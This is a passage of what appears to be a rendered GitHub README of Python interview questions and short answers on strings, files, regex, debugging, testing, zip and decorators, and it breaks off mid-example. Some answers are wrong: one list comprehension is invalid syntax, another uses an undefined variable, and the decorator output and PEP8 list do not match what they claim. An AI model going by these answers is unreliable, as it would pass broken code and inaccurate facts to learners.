&lt;h4&gt;&lt;a id="user-content-files" class="anchor" aria-hidden="true" href="#files"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Files&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to write to a file?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;with open('file.txt', 'w') as file:
    file.write("My insightful comment")
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to print the 12th line of a file?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to reverse a file?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Sum all the integers in a given file&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you write a function which will print all the file in a given directory? including sub-directories&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-regex" class="anchor" aria-hidden="true" href="#regex"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Regex&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How do you perform regular expressions related operations in Python? (match patterns, substitute strings, etc.)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Using the re module
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to substitute the string "green" with "blue"?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to find all the IP addresses in a variable? How to find them in a file?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You have the following list: &lt;code&gt;[{'name': 'Mario', 'food': ['mushrooms', 'goombas']}, {'name': 'Luigi', 'food': ['mushrooms', 'turtles']}]&lt;/code&gt;
  Extract all type of foods. Final output should be: {'mushrooms', 'goombas', 'turtles'}&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;brothers_menu =  \
[{'name': 'Mario', 'food': ['mushrooms', 'goombas']}, {'name': 'Luigi', 'food': ['mushrooms', 'turtles']}]

# "Classic" Way
def get_food(brothers_menu) -&amp;gt; set:
    temp = []

    for brother in brothers_menu:
        for food in brother['food']:
            temp.append(food)

    return set(temp)

# One liner way (Using list comprehension)
set([food for bro in x for food in bro['food']])
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is List Comprehension? Is it better than a typical loop? Why? Can you demonstrate how to use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-python-strings" class="anchor" aria-hidden="true" href="#python-strings"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Python Strings&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to extract the unique characters from a string? for example given the input "itssssssameeeemarioooooo" the output will be "mrtisaoe"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;x = "itssssssameeeemarioooooo"
y = ''.join(set(x))
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Find all the permutations of a given string&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;def permute_string(string):

    if len(string) == 1:
        return [string]

    permutations = []
    for i in range(len(string)):
        swaps = permute_string(string[:i] + string[(i+1):])
        for swap in swaps:
            permutations.append(string[i] + swap)

    return permutations

print(permute_string("abc"))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Short way (but probably not acceptable in interviews):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from itertools import permutations

[''.join(p) for p in permutations("abc")]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Detailed answer can be found here: &lt;a href="http://codingshell.com/python-all-string-permutations" rel="nofollow"&gt;http://codingshell.com/python-all-string-permutations&lt;/a&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to check if a string contains a sub string?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Find the frequency of each character in string&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Count the number of spaces in a string&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Given a string, find the N most repeated words&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Given the string (which represents a matrix) "1 2 3\n4 5 6\n7 8 9" create rows and colums variables (should contain integers, not strings)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the result of each of the following?
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt; ', '.join(["One", "Two", "Three"])
&amp;gt;&amp;gt; " ".join("welladsadgadoneadsadga".split("adsadga")[:2])
&amp;gt;&amp;gt; "".join(["c", "t", "o", "a", "o", "q", "l"])[0::2]
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 'One, Two, Three'
&amp;gt;&amp;gt;&amp;gt; 'well done'
&amp;gt;&amp;gt;&amp;gt; 'cool'
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to reverse a string? (e.g. pizza -&amp;gt; azzip)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Shortest way is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;my_string[::-1]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But it doesn't mean it's the most efficient one. &lt;br&gt;&lt;/p&gt;
&lt;p&gt;The Classic way is:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def reverse_string(string):
    temp = ""
    for char in string:
        temp =  char + temp
    return temp
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the output of the following code: &lt;code&gt;"".join(["a", "h", "m", "a", "h", "a", "n", "q", "r", "l", "o", "i", "f", "o", "o"])[2::3]&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;mario
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain data serialization and how do you perform it with Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you handle argument parsing in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an iterator?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a generator? Why using generators?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is &lt;code&gt;yeild&lt;/code&gt;? When would you use it?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following types of methods and how to use them:
&lt;ul&gt;
&lt;li&gt;Static method&lt;/li&gt;
&lt;li&gt;Class method&lt;/li&gt;
&lt;li&gt;instance method&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How to reverse a list?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to combine list of strings into one string with spaces between the strings&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You have the following list of nested lists: &lt;code&gt;[['Mario', 90], ['Geralt', 82], ['Gordon', 88]]&lt;/code&gt; How to sort the list by the numbers in the nested lists?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;One way is:&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;the_list.sort(key=lambda x: x[1])
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following:
&lt;ul&gt;
&lt;li&gt;zip()&lt;/li&gt;
&lt;li&gt;map()&lt;/li&gt;
&lt;li&gt;filter()&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;h4&gt;&lt;a id="user-content-debugging" class="anchor" aria-hidden="true" href="#debugging"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Debugging&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How do you debug Python code?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;pdb :D
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to check how much time it took to execute a certain script or block of code?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What empty &lt;code&gt;return&lt;/code&gt; returns?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;
&lt;p&gt;Short answer is: It returns a None object.&lt;/p&gt;
&lt;p&gt;We could go a bit deeper and explain the difference between&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def a ():
    return
    
&amp;gt;&amp;gt;&amp;gt; None
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def a ():
    pass
    
&amp;gt;&amp;gt;&amp;gt; None
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or we could be asked this as a following question, since they both give the same result.&lt;/p&gt;
&lt;p&gt;We could use the dis module to see what's going on:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  2           0 LOAD_CONST               0 (&amp;lt;code object a at 0x0000029C4D3C2DB0, file "&amp;lt;dis&amp;gt;", line 2&amp;gt;)
              2 LOAD_CONST               1 ('a')
              4 MAKE_FUNCTION            0
              6 STORE_NAME               0 (a)

  5           8 LOAD_CONST               2 (&amp;lt;code object b at 0x0000029C4D3C2ED0, file "&amp;lt;dis&amp;gt;", line 5&amp;gt;)
             10 LOAD_CONST               3 ('b')
             12 MAKE_FUNCTION            0
             14 STORE_NAME               1 (b)
             16 LOAD_CONST               4 (None)
             18 RETURN_VALUE

Disassembly of &amp;lt;code object a at 0x0000029C4D3C2DB0, file "&amp;lt;dis&amp;gt;", line 2&amp;gt;:
  3           0 LOAD_CONST               0 (None)
              2 RETURN_VALUE

Disassembly of &amp;lt;code object b at 0x0000029C4D3C2ED0, file "&amp;lt;dis&amp;gt;", line 5&amp;gt;:
  6           0 LOAD_CONST               0 (None)
              2 RETURN_VALUE
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;An empty &lt;code&gt; return&lt;/code&gt; is exactly the same as &lt;code&gt;return None&lt;/code&gt; and functions without any explicit return
will always return None regardless of the operations, therefore&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def sum(a, b):
    global c
    c = a + b
    
&amp;gt;&amp;gt;&amp;gt; None
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to improve the following block of code?
&lt;pre&gt;&lt;code&gt;li = []
for i in range(1, 10):
    li.append(i)
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;[for i in in range(1, 10)]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Given the following function
&lt;pre&gt;&lt;code&gt;def is_int(num):
    if isinstance(num, int):
        print('Yes')
    else:
        print('No')
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;What would be the result of is_int(2) and is_int(False)?&lt;/p&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-data-structures--types-1" class="anchor" aria-hidden="true" href="#data-structures--types-1"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Data Structures &amp;amp; Types&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Implement Stack in Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Implement Hash table in Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h5&gt;&lt;a id="user-content-python-testing" class="anchor" aria-hidden="true" href="#python-testing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Python Testing&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is your experience with writing tests in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is PEP8? Give an example of 3 style guidelines&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;PEP8 is a list of coding conventions and style guidelines for Python&lt;/p&gt;
&lt;p&gt;5 style guidelines:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. Limit all lines to a maximum of 79 characters.
2. Surround top-level function and class definitions with two blank lines.
3. Use commas when making a tuple of one element
4. Use spaces (and not tabs) for indentation
5. Use 4 spaces per indentation level
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How would you check if two strings are equal? What about booleans?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How to test if an exception was raised?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What &lt;code&gt;assert&lt;/code&gt; does in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain mocks&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you measure execution time of small code snippets?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Why one shouldn't use &lt;code&gt;assert&lt;/code&gt; in non-test/production code?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-flask" class="anchor" aria-hidden="true" href="#flask"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Flask&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;You wrote you have experience with Django/Flask. Can you describe what is Django/Flask and how you have used it? Why Flask and not Djano? (or vice versa)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a route?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you manage DB integration?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-zip" class="anchor" aria-hidden="true" href="#zip"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;zip&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Given &lt;code&gt;x = [1, 2, 3]&lt;/code&gt;, what is the result of list(zip(x))?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;[(1,), (2,), (3,)]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the result of each of the following:
&lt;pre&gt;&lt;code&gt;list(zip(range(5), range(50), range(50)))
list(zip(range(5), range(50), range(-2)))
&lt;/code&gt;&lt;/pre&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;[(0, 0, 0), (1, 1, 1), (2, 2, 2), (3, 3, 3), (4, 4, 4)]
[]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-misc" class="anchor" aria-hidden="true" href="#misc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Misc&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Implement simple calculator for two numbers&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;def add(num1, num2):
    return num1 + num2
        
        
def sub(num1, num2):
    return num1 - num2


def mul(num1, num2):
    return num1*num2


def div(num1, num2):
    return num1 / num2

operators = { 
    '+': add,
    '-': sub,
    '*': mul,
    '/': div 
}

if __name__ == '__main__':
    operator = str(input("Operator: "))
    num1 = int(input("1st number: "))
    num2 = int(input("2nd number: "))
    print(operators[operator](num1, num2))
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;a name="user-content-python-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-8" class="anchor" aria-hidden="true" href="#star-advanced-8"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What data types are you familiar with that are not Python built-in types but still provided by modules which are part of the standard library?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;This is a good reference &lt;a href="https://docs.python.org/3/library/datatypes.html" rel="nofollow"&gt;https://docs.python.org/3/library/datatypes.html&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is a decorator&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;
&lt;b&gt;In python, everything is an object, even functions themselves. Therefore you could pass functions as arguments
for another function eg;
&lt;pre&gt;&lt;code&gt;def wee(word):
    return word

def oh(f):
    return f + "Ohh"
    
&amp;gt;&amp;gt;&amp;gt; oh(wee("Wee"))
&amp;lt;&amp;lt;&amp;lt; Wee Ohh
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This allows us to control the before execution of any given function and if we added another function as wrapper,
(a function receiving another function that receives a function as parameter) we could also control the after execution.&lt;/p&gt;
&lt;p&gt;Sometimes we want to control the before-after execution of many functions and it would get tedious to write&lt;/p&gt;
&lt;p&gt;&lt;code&gt; f = function(function_1())&lt;/code&gt;
&lt;code&gt; f = function(function_1(function_2(*args)))&lt;/code&gt;&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;every time, that's what decorators do, they introduce syntax to write all of this on the go, using the keyword '@'.
&lt;/b&gt;&lt;/p&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Can you show how to write and use decorators?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;code&gt;
These two decorators (ntimes and timer) are usually used to display decorators functionalities, you can find them in lots of
tutorials/reviews. I first saw these examples two years ago in pyData 2017. https://www.youtube.com/watch?v=7lmCu8wz8ro&amp;amp;t=3731s&lt;/code&gt;
&lt;pre&gt;&lt;code&gt;Simple decorator:

def deco(f):
    print(f"Hi I am the {f.__name__}() function!")
    return f

@deco
def hello_world():
    return "Hi, I'm in!"

a = hello_world()
print(a)

